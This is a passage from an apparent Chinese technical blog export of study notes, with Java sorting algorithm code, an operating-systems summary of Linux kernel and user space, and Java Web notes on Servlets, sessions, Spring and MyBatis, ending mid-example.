end) / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[left] &lt; pivot) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[right] &gt; pivot) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        quickSort(nums, start, right);</span><br><span class="line">        quickSort(nums, left, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: hta</span></span><br><span class="line"><span class="comment"> * since: 上午10:45 17-5-6</span></span><br><span class="line"><span class="comment"> * time: O(nlogn)</span></span><br><span class="line"><span class="comment"> * param: int[] nums, int[] temp, int start, int end</span></span><br><span class="line"><span class="comment"> * return: void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">55</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        mergeSort(nums, temp, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        mergeSort(nums, temp, left, mid);</span><br><span class="line">        mergeSort(nums, temp, mid + <span class="number">1</span>, right);</span><br><span class="line">        merge(nums, temp, start, mid, end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> mid, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> leftIndex = start;</span><br><span class="line">        <span class="keyword">int</span> rightIndex = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> index = start;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid &amp;&amp; rightIndex &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[leftIndex] &lt;= nums[rightIndex]) &#123;</span><br><span class="line">                temp[index++] = nums[leftIndex++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp[index++] = nums[rightIndex++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid) &#123;</span><br><span class="line">            temp[index++] = nums[leftIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (rightIndex &lt;= end) &#123;</span><br><span class="line">            temp[index++] = nums[rightIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            nums[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:59</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 简单选择排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">selectSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> min = nums[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; min) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = min;</span><br><span class="line">                    min = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[i] = min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        selectSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> sort </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统总结</title>
      <link href="/system-summary/"/>
      <url>/system-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="linux内核空间和用户空间详解"><a class="markdownIt-Anchor" href="#linux内核空间和用户空间详解"></a> Linux内核空间和用户空间详解</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><p>Linux简化了分段机制，使得虚拟地址与线性地址总是一致，因此，Linux的虚拟地址空间也为0~4G。Linux内核将这4G字节的空间分为两部分。**将较高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间”。**因为各个进程可以通过系统调用进入内核，因此，Linux内核是系统内的所有进程共享。于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。</p><p>**Linux使用两级保护机制：0级供内核使用，3级供用户程序使用。**每个进程有各自的私有用户空间（0~3G），这个空间对系统中的其他进程是不可见的。最高的1GB字节虚拟内核空间则为所有进程以及内核所共享。</p><blockquote><p>内核空间中存放的是内核代码和数据，而进程的用户空间中存放的是用户程序的代码和数据。不管是内核空间还是用户空间，它们都处于虚拟空间中。</p></blockquote><p>虽然内核空间占据了每个虚拟空间中的最高1GB字节，但映射到物理内存却总是从最低地址（0x00000000）开始。对内核空间来说，其地址映射是很简单的线性映射，0xC0000000就是物理地址与线性地址之间的位移量，在Linux代码中就叫做PAGE_OFFSET。</p><p><strong>常见问题：</strong></p><ol><li>内核空间和用户空间之间如何进行通讯？<br />一般通过系统调用进行通信</li><li>如何判断一个驱动是用户模式还是内核模式驱动？判断的标志是什么？<br />用户空间模式的驱动一般通过系统调用来完成对硬件的访问，如通过系统调用将驱动的io空间映射到用户空间等。<strong>因此，主要的判断依据就是系统调用。</strong></li></ol><h3 id="内核态和用户态"><a class="markdownIt-Anchor" href="#内核态和用户态"></a> 内核态和用户态</h3><p>当一个任务（进程）执行系统调用而陷入内核代码中执行时，我们就称进程处于内核运行态（或简称为内核态）。此时处理器处于特权级最高的（0级）内核代码中执行。当进程处于内核态时，执行的内核代码会使用当前进程的内核栈。每个进程都有自己的内核栈。当进程在执行用户自己的代码时，则称其处于用户运行态（用户态）。即此时处理器在特权级最低的（3级）用户代码中运行。当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。这与处于内核态的进程的状态有些类似。</p><h3 id="进程上下文和中断上下文"><a class="markdownIt-Anchor" href="#进程上下文和中断上下文"></a> 进程上下文和中断上下文</h3><p>处理器总处于以下状态中的一种：</p><ul><li>内核态，运行于进程上下文，内核代表进程运行于内核空间；</li><li>内核态，运行于中断上下文，内核代表硬件运行于内核空间；</li><li>用户态，运行于用户空间。</li></ul><p>用户空间的应用程序，通过系统调用，进入内核空间。这个时候用户空间的进程要传递很多变量、参数的值给内核，内核态运行的时候也要保存用户进程的一些寄存器值、变量等。所谓的“进程上下文”，可以看作是用户进程传递给内核的这些参数以及内核要保存的那一整套的变量和寄存器值和当时的环境等。</p><p>硬件通过触发信号，导致内核调用中断处理程序，进入内核空间。这个过程中，硬件的一些变量和参数也要传递给内核，内核通过这些参数进行中断处理。所谓的“中断上下文”，其实也可以看作就是硬件传递过来的这些参数和内核需要保存的一些其他环境（主要是当前被打断执行的进程环境）。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web总结</title>
      <link href="/java-web-summary/"/>
      <url>/java-web-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jsp与servlet的区别"><a class="markdownIt-Anchor" href="#jsp与servlet的区别"></a> JSP与Servlet的区别</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/JSP%E4%B8%8EServlet%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="JSP与Servlet的区别" /></p><h2 id="servlet的生命周期"><a class="markdownIt-Anchor" href="#servlet的生命周期"></a> Servlet的生命周期</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Servlet%E7%9A%84%E6%8E%A5%E5%8F%A3.png" alt="Servlet的接口" /></p><p>前三个方法与Servlet的生命周期相关，Web容器加载Servlet并将其实例化之后，Servlet的生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法根据需要调用与请求相对应的doGet()或doPost()方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用destroy()方法</p><h2 id="如何保持会话状态有哪些方式区别如何"><a class="markdownIt-Anchor" href="#如何保持会话状态有哪些方式区别如何"></a> 如何保持会话状态，有哪些方式，区别如何？</h2><ul><li>URL重写：在URL中添加用户会话的信息作为请求的参数，或者将唯一的会话ID添加到URL结尾以表示一个会话</li><li>设置表单隐藏域：将和会话跟踪相关的字段添加到隐藏表单域中，这些信息不回在浏览器中显示但是在提交表单时会提交给服务器</li></ul><p>以上两种方式都比较难以处理跨越多个页面的信息传递，因为如果每次都要修改URL或者在页面添加隐藏表单域来存储用户会话相关的信息，会变得比较复杂。</p><p>HTML5中可以使用<code>Web Storage</code>技术通过JavaScript来保持数据，例如可以使用<code>localStorage</code>和<code>sessionStorage</code>来保存用户会话的信息，它能够实现会话跟踪</p><h2 id="cookie和session的区别"><a class="markdownIt-Anchor" href="#cookie和session的区别"></a> cookie和session的区别</h2><p>由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。</p><p>每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。</p><p>如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。</p><p><em>总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</em></p><h2 id="spring-ioc和aop"><a class="markdownIt-Anchor" href="#spring-ioc和aop"></a> Spring IOC和AOP</h2><ol><li><p>Spring IOC</p><p>IOC叫控制反转，是Inversion of Control的缩写，DI(Dependency Injection)叫依赖注入，是对IOC更简单的诠释。**控制反转是把传统上由程序代码直接操控的对象调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的控制反转就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建并管理对象之间的依赖关系。**DI是对IOC更准确的描述，即组件之间的依赖关系由容器在运行期间决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。</p><p>举个例子：类A需要用到接口B中的方法，那么就需要类A与接口B建立关联或者依赖关系，最原始的方法就在在类A创建接口B的实现类C的实例，但**这种方法要求开发人员自行维护两者的依赖关系，即当依赖关系需要改变的时候需要修改代码并重新构建整个系统。**如果通过一个容器来管理这些对象的依赖关系，只需要在类A中定义好用于管理接口B的方法（构造器或者setter方法），将类A与接口B的实现类C放入容器，通过对容器的配置来实现两者的关系。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20IOC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="Spring IOC实现原理" /></p></li><li><p>Spring AOP</p><p>AOP(Aspect-Oriented Programming)指一种程序设计范式，该范式以一种称为切面（aspect）的语言构造为基础，**切面是一种新的模块化机制，用来描述分散在对象、类或方法中的横切关注点。**通常，事务、日志、安全性等关注就是应用中的横切关注功能。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20AOP%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="Spring+AOP实现原理" /></p></li><li><p>IOC容器的加载过程</p><ul><li>创建IOC配置文件的抽象资源</li><li>创建一个BeanFactory</li><li>把读取配置信息的BeanDefinitionReader，这里是XmlBeanDefinitionReader配置给BeanFactory</li><li>把定义好的资源位置读入配置信息，具体解析过程有XmlBeanDefinitionReader来完成，这样完成整个载入bean定义的过程</li></ul></li><li><p>动态代理与cglib实现的区别</p><ul><li>JDK动态代理只能对实现了接口的类生成代理，而不能针对类</li><li>CGLIB是针对类实现代理，主要是对指定的类生成了一个子类，覆盖其中的方法。因为是继承，<strong>所以该类或方法最好不要声明成final</strong></li><li>JDK代理是不需要第三方库，只要JDK环境就可以进行代理</li><li>CGLib必须依赖于CGLib的类库，但是它需要类来实现任何接口代理的是指定的类生成一个子类，覆盖其中的方法，是一种继承</li></ul></li></ol><h2 id="spring-mvc的原理"><a class="markdownIt-Anchor" href="#spring-mvc的原理"></a> Spring MVC的原理</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20160427094830780.jpg" alt="" /></p><p>Spring MVC主要由DispatcherServlet、处理器映射、处理器（控制器）、视图解析器、视图组成。两个核心是：</p><ul><li>**处理器映射：**选择使用哪个控制器来处理请求</li><li>**视图解析器：**选择结果应该如何渲染</li></ul><p>通过以上两点，Spring MVC保证了如何选择控制处理请求和如何选择视图展现输出之间的松耦合。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20MVC%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86.png" alt="Spring MVC运行原理" /></p><h2 id="mybatis"><a class="markdownIt-Anchor" href="#mybatis"></a> Mybatis</h2><ol><li><p>#{}和${}的区别是什么？</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&#125;是预编译处理，$&#123;&#125;是字符串替换</span><br><span class="line">Mybatis在处理#&#123;&#125;时，会将sql中的#&#123;&#125;替换为?号，调用PreparedStatement的set方法来赋值</span><br><span class="line">Mybatis在处理$&#123;&#125;时，就是把$&#123;&#125;替换成变量的值</span><br><span class="line">使用#&#123;&#125;可以有效的防止SQL注入，提高系统安全性</span><br></pre></td></tr></table></figure></li><li><p>当实体类中的属性名和表中字段名不一样，怎么办？</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种：通过在查询的sql语句中定义字段名的别名，让字段名的别名和实体类的属性名一致</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectorder"</span> <span class="attr">paramaterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"me.gacl.domain.order"</span>&gt;</span></span><br><span class="line">  select order_id id, order_no orderno, order_price price from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第二种：通过<span class="tag">&lt;<span class="name">resultMap</span>&gt;</span>来映射字段名和实体类属性名的一一对应的关系</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getOrder"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  select * from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"me.gacl.domain.order"</span> <span class="attr">id</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用id属性来映射主键字段-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"order_id"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用result属性来映射非主键字段，property为实体类属性名，column为数据表中的属性-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"orderno"</span> <span class="attr">column</span>=<span class="string">"order_no"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"price"</span> <span class="attr">column</span>=<span class="string">"order_price"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>模糊查询like语句该怎么写？</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种：在Java代码中添加sql通配符</span><br><span class="line">String wildCardName = "%smi%";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span> = <span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第2种：在sql语句中拼接通配符，会引起sql注入</span><br><span class="line">String wildCardName = "smi";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like "%"#&#123;value&#125;"%"</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第3种：使用动态SQL语句，OGNL表达式中的bind标签</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectEmployLikeName"</span> <span class="attr">resultType</span>=<span class="string">"org.fkit.domain.Employee"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">"pattern"</span> <span class="attr">value</span>=<span class="string">"'%' + _parameter.getName() + '%'"</span> /&gt;</span></span><br><span class="line">  select * from tb_employee where loginname like #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据传入的参数进行模糊查询</span></span><br><span class="line"><span class="function">List&lt;Employee&gt; <span class="title">selectEmployeeLikeName</span><span class="params">(Employee employee)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(SqlSession session)</span> </span>&#123;</span><br><span class="line">  EmployeeMapper em = session.getMapper(EmployeeMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  Employee employee = <span class="keyword">new</span> Employee();</span><br><span class="line">  <span class="comment">// 设置模糊查询的参数</span></span><br><span class="line">  employee.setName(<span class="string">"o"</span>);</span><br><span class="line">  List&lt;Employee&gt; list = em.selectEmployeeLikeName(employee);</span><br><span class="line">  System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通常一个xml映射文件，都会写一个Dao接口与之对应，请问，这个Dao接口的工作原理是什么？Dao接口里的方法，参数不同时，方法能重载吗？<br />答：Dao接口，就是人们通常说的Mapper接口，接口的全限名，就是映射文件中的namespace的值，接口的方法名，就是映射文件中MappedStatement的id值，就是传递给sql的参数。Mapper接口没有实现类，当调用接口方法时，接口全限名+方法名拼接字符串作为key值，可唯一定位一个MappedStatement，举例：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到namespace为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement。在Mybatis中，每一个<span class="tag">&lt;<span class="name">select</span>&gt;</span>、<span class="tag">&lt;<span class="name">insert</span>&gt;</span>、<span class="tag">&lt;<span class="name">update</span>&gt;</span>、<span class="tag">&lt;<span class="name">delete</span>&gt;</span>标签，都会被解析为一个MappedStatement对象</span><br></pre></td></tr></table></figure><p>Dao接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。<br />Dao接口的工作原理是JDK动态代理，Mybatis运行时会使用JDK动态代理为Dao接口生成代理proxy对象，代理对象proxy会拦截方法接口，转而执行MappedStatement所代表的sql，然后将sql执行结果返回。</p></li><li><p>Mybatis是如何将sql执行结果封装成目标对象并返回的？都有哪些映射形式？<br />答：第一种是使用<resultMap>标签，逐一定义列名和对象属性名之间的映射关系；第二种是使用sql列的别名功能，将列别名书写为对象属性名，比如T_NAME AS NAME，对象属性名一般是name，小写，但是列名不区分大小写，Mybatis会忽略列名大小写，智能找到与之对应对象属性名，甚至可以写成T_NAME AS NaMe，Mybatis一样可以正常工作。</p><p>有了列名与属性名的映射关系后，Mybatis通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。</p></li><li><p>Mybatis是如何进行分页的？分页插件的原理是什么？<br />答：Mybatis使用RowBounds对象进行分页，它是针对ResultSet结果集执行的内存分页，而非物理分页，可以在sql内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。</p><p>分页插件的基本原理是使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的sql，然后重写sql，根据dialect方言，添加对应的物理分页语句和物理分页参数。</p></li><li><p>如何执行批量插入？<br />首先，创建一个简单的insert语句：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span>&gt;</span></span><br><span class="line">  insert into names (name) values (#&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Java代码中像下面这样执行批处理插入。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; names = <span class="keyword">new</span> ArrayList&lt;&gt;(); </span><br><span class="line">names.add(“fred”); </span><br><span class="line">names.add(“barney”); </span><br><span class="line">names.add(“betty”); </span><br><span class="line">names.add(“wilma”); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里 executortype.batch </span></span><br><span class="line">sqlsession sqlsession = sqlsessionfactory.opensession(executortype.batch); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">  namemapper mapper = 